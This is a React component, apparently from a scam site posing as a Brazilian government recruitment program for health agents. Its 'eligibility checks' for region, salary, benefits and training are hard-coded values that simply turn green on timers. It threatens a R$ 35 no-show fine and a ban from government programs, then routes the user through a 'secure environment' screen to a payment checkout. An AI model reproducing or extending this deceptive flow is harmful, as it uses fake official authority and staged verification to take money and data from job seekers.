import React, { useState, useEffect } from "react";
import { Check, MapPin, DollarSign, GraduationCap, Award } from "lucide-react";
import { useLocation } from "../context/LocationContext";
import GovLogo from "../components/GovLogo";
import useUtmNavigator from "../hooks/useUtmNavigator";

const ProgramDetails: React.FC = () => {
	const navigate = useUtmNavigator();
	const { selectedCEP, nearbySchools } = useLocation();
	const [selectedLocation, setSelectedLocation] = useState<string>("");
	const [acceptedTerms, setAcceptedTerms] = useState({
		attendance: false,
		information: false,
	});
	const [showSuccess, setShowSuccess] = useState(false);
	const [showSuccessMessage, setShowSuccessMessage] = useState(false);
	const [confirmationSteps, setConfirmationSteps] = useState([
		{
			id: "region",
			status: "loading",
			title: "Confirmação da Região",
			subtitle: "Verificando região...",
			icon: MapPin,
			value: "30 vagas disponíveis",
		},
		{
			id: "salary",
			status: "loading",
			title: "Salário Disponível",
			subtitle: "Calculando remuneração mensal...",
			icon: DollarSign,
			value: "R$ 4.954,36 mensais",
		},
		{
			id: "benefits",
			status: "loading",
			title: "Benefícios Adicionais",
			subtitle: "Verificando pacote de benefícios...",
			icon: Award,
			value: "Vale alimentação, plano de saúde e seguro de vida",
		},
		{
			id: "training",
			status: "loading",
			title: "Treinamento Gratuito",
			subtitle: "Consultando programas de treinamento...",
			icon: GraduationCap,
			value: "Capacitação integral e efetiva, com certificado reconhecido nacionalmente",
		},
	]);

	useEffect(() => {
		if (!selectedCEP) {
			navigate("/inscricao");
			return;
		}

		const completeSteps = async () => {
			for (let i = 0; i < confirmationSteps.length; i++) {
				await new Promise((resolve) => setTimeout(resolve, 1000));
				setConfirmationSteps((prev) =>
					prev.map((step, index) => ({
						...step,
						status: index <= i ? "completed" : "loading",
					})),
				);
			}
			setShowSuccessMessage(true);
		};

		completeSteps();
	}, [selectedCEP]);

	const handleSubmit = () => {
		if (selectedLocation && acceptedTerms.attendance && acceptedTerms.information) {
			setShowSuccess(true);
			setTimeout(() => {
				setShowSuccess(false);
				navigate("/checkout");
			}, 4000);
		}
	};

	const completedSteps = confirmationSteps.filter((step) => step.status === "completed").length;
	const progress = (completedSteps / confirmationSteps.length) * 100;

	return (
		<main className="container mx-auto px-4 py-8 flex-grow">
			<div className="max-w-2xl mx-auto">
				<h1 className="text-[#1351B4] text-2xl font-bold mb-2">Inscrição no Programa Mais Saúde com Agente</h1>

				<h2 className="text-xl font-bold mb-4">Confirmação da sua Inscrição</h2>

				<div className="h-2 bg-blue-100 rounded-full mb-8">
					<div
						className="h-2 bg-[#1351B4] rounded-full transition-all duration-1000"
						style={{ width: `${progress}%` }}
					></div>
				</div>

				<div className="space-y-8 relative">
					<div className="absolute left-[15px] top-0 bottom-0 w-[2px] bg-gray-200"></div>

					{confirmationSteps.map((step, index) => (
						<div key={step.id} className="flex items-start gap-6 relative">
							<div
								className={`w-8 h-8 rounded-full flex items-center justify-center z-10 transition-colors duration-300 ${
									step.status === "completed"
										? "bg-green-500 text-white"
										: step.status === "loading"
										? "bg-blue-100 text-blue-500"
										: "bg-gray-200"
								}`}
							>
								{step.status === "completed" ? <Check size={16} /> : <step.icon size={16} />}
							</div>
							<div className="flex-1 pt-1">
								<div className="flex items-center gap-2 text-lg font-semibold">
									<span>{step.title}</span>
								</div>
								<p className={`${step.status === "completed" ? "text-green-600" : "text-gray-500"}`}>
									{step.status === "completed" ? step.value : step.subtitle}
								</p>
							</div>
						</div>
					))}
				</div>

				{showSuccessMessage && (
					<div className="mt-8 p-6 bg-green-50 rounded-lg border border-green-100">
						<h3 className="text-green-700 font-bold text-lg mb-2">
							Parabéns! Sua avaliação preliminar foi bem-sucedida.
						</h3>
						<p className="text-gray-700">
							Selecione abaixo um local para realização da sua prova de admissão no programa. Esta é a
							última etapa para concluir sua inscrição.
						</p>
					</div>
				)}

				{confirmationSteps.every((step) => step.status === "completed") && (
					<>
						<div className="bg-white rounded-lg p-6 shadow-sm mb-8">
							<h2 className="text-xl font-bold text-[#1351B4] mb-6">
								Local de Prova do Processo Seletivo
							</h2>

							<p className="text-gray-600 mb-6">
								Selecione abaixo o local de prova mais conveniente para você. Mostrando escolas próximas
								ao CEP {selectedCEP}.
							</p>

							<div className="space-y-4">
								{nearbySchools.map((school) => (
									<label
										key={school.id}
										className={`block p-4 rounded-lg border-2 cursor-pointer transition-colors ${
											selectedLocation === school.id
												? "border-[#1351B4] bg-blue-50"
												: "border-gray-200 hover:border-gray-300"
										}`}
									>
										<div className="flex items-start gap-3">
											<input
												type="radio"
												name="location"
												value={school.id}
												checked={selectedLocation === school.id}
												onChange={(e) => setSelectedLocation(e.target.value)}
												className="mt-1"
											/>
											<div>
												<div className="font-medium">{school.name}</div>
												<div className="text-gray-500 flex items-center gap-1 mt-1">
													<MapPin size={16} />
													<span>{school.type}</span>
													<span>•</span>
													<span>{school.distance.toFixed(1)}km de distância</span>
												</div>
											</div>
										</div>
									</label>
								))}
							</div>
						</div>

						<div className="space-y-4 mb-8">
							<label
								className={`block p-4 rounded-lg transition-all ${
									acceptedTerms.attendance
										? "bg-green-50 border border-green-100"
										: "bg-red-50 border border-red-100"
								}`}
							>
								<div className="flex items-start gap-3">
									<div className="relative flex items-center justify-center">
										<input
											type="checkbox"
											checked={acceptedTerms.attendance}
											onChange={(e) =>
												setAcceptedTerms((prev) => ({
													...prev,
													attendance: e.target.checked,
												}))
											}
											className="appearance-none w-5 h-5 rounded border transition-colors cursor-pointer
                        checked:bg-green-500 checked:border-green-500"
										/>
										{acceptedTerms.attendance && (
											<Check size={16} className="absolute text-white pointer-events-none" />
										)}
									</div>
									<div>
										<div className="font-medium text-red-700">
											Concordo com a política de não comparecimento
										</div>
										<p className="text-red-600 text-sm mt-1">
											Caso não compareça à prova, estarei sujeito a{" "}
											<strong>multa de R$ 35,00</strong> e bloqueio temporário de 90 dias para
											novas inscrições em programas do governo.
										</p>
									</div>
								</div>
							</label>

							<label
								className={`block p-4 rounded-lg transition-all ${
									acceptedTerms.information
										? "bg-green-50 border border-green-100"
										: "bg-red-50 border border-red-100"
								}`}
							>
								<div className="flex items-start gap-3">
									<div className="relative flex items-center justify-center">
										<input
											type="checkbox"
											checked={acceptedTerms.information}
											onChange={(e) =>
												setAcceptedTerms((prev) => ({
													...prev,
													information: e.target.checked,
												}))
											}
											className="appearance-none w-5 h-5 rounded border transition-colors cursor-pointer
                        checked:bg-green-500 checked:border-green-500"
										/>
										{acceptedTerms.information && (
											<Check size={16} className="absolute text-white pointer-events-none" />
										)}
									</div>
									<div>
										<div className="font-medium text-red-700">
											Declaro que as informações são verdadeiras
										</div>
										<p className="text-red-600 text-sm mt-1">
											A falsificação de informações ou documentos resultará em
											<strong> cancelamento imediato da inscrição</strong> e banimento permanente
											de todos os processos seletivos do programa.
										</p>
									</div>
								</div>
							</label>
						</div>

						<button
							onClick={handleSubmit}
							disabled={!selectedLocation || !acceptedTerms.attendance || !acceptedTerms.information}
							className="w-full bg-[#1351B4] text-white py-4 rounded-full flex items-center justify-center gap-2 hover:bg-[#1351B4]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
						>
							<Check size={20} />
							<span className="font-semibold">Finalizar Inscrição</span>
						</button>
					</>
				)}

				{showSuccess && (
					<div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
						<div className="bg-white rounded-lg p-8 max-w-md w-full mx-4">
							<div className="flex flex-col items-center">
								<GovLogo />
								<h2 className="text-2xl font-bold text-[#1351B4] mt-8 mb-4 whitespace-nowrap">
									Carregando Ambiente Seguro...
								</h2>
								<p className="text-gray-600 text-center mb-8">
									Estamos preparando um ambiente seguro para o processamento do seu pagamento. Por
									favor, aguarde um momento.
								</p>
								<div className="w-12 h-12 border-4 border-[#1351B4] border-t-transparent rounded-full animate-spin mb-8"></div>
								<p className="text-xs text-gray-500 text-center">
									Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD) e as
									melhores práticas de segurança.
								</p>
							</div>
						</div>
					</div>
				)}
			</div>
		</main>
	);
};

export default ProgramDetails;
